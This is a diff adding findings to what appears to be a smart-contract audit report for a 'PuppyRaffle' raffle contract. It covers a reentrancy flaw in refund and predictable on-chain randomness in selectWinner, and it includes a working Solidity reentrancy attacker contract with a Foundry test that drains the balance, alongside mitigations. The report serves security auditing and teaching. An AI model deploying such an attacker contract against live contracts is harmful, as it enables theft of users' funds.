@@ -1,3 +1,115 @@
+### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain contract balance
+
+**Description:** The `PuppyRaffle::refund` function does not follow [CEI/FREI-PI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables participants to drain the contract balance.
+
+In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `players` array.
+
+```javascript
+function refund(uint256 playerIndex) public {
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+    payable(msg.sender).sendValue(entranceFee);
+
+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+}
+```
+
+A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue to cycle this until the contract balance is drained.
+
+**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.
+
+**Proof of Concept:**
+
+1. Users enters the raffle.
+2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
+3. Attacker enters the raffle
+4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.
+
+**Proof of Code:**
+
+<details>
+<summary>Code</summary>
+Add the following code to the `PuppyRaffleTest.t.sol` file.
+
+```javascript
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(address _puppyRaffle) {
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    fallback() external payable {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+}
+
+function testReentrance() public playersEntered {
+    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
+    vm.deal(address(attacker), 1e18);
+    uint256 startingAttackerBalance = address(attacker).balance;
+    uint256 startingContractBalance = address(puppyRaffle).balance;
+
+    attacker.attack();
+
+    uint256 endingAttackerBalance = address(attacker).balance;
+    uint256 endingContractBalance = address(puppyRaffle).balance;
+    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
+    assertEq(endingContractBalance, 0);
+}
+```
+
+</details>
+
+**Recommended Mitigation:** To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.
+
+```diff
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
++       players[playerIndex] = address(0);
++       emit RaffleRefunded(playerAddress);
+        (bool success,) = msg.sender.call{value: entranceFee}("");
+        require(success, "PuppyRaffle: Failed to refund player");
+-        players[playerIndex] = address(0);
+-        emit RaffleRefunded(playerAddress);
+    }
+```
+
+### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to choose winner
+
+**Description:** Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.
+
+**Impact:** Any user can choose the winner of the raffle, winning the money and selecting the "rarest" puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy.
+
+**Proof of Concept:**
+
+There are a few attack vectors here.
+
+1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
+2. Users can manipulate the `msg.sender` value to result in their index being the winner.
+
+Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.
+
+**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).
+
 ### [M-1] Looping through players array to check for duplicates in `PuppyRaffle:enterRaffle` is a potential denail of service (DoS) attack, incrementing gas costs for future entrants
 
 **Description:** Gas will grow.
